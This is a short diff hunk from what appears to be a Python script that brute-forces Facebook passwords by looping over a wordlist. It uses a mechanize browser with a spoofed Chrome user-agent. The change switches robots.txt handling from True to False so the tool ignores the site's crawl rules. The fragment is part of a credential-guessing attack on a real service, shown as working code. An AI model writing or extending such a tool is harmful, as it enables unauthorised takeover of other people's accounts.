@@ -41,7 +41,7 @@ for password in wordlist:
     else:
         try:
             browser = mechanize.Browser() 
-            browser.set_handle_robots(True)
+            browser.set_handle_robots(False)
             browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
             fb = browser.open('https://facebook.com')
             dos = open('Facebook-Log.txt', 'w+')
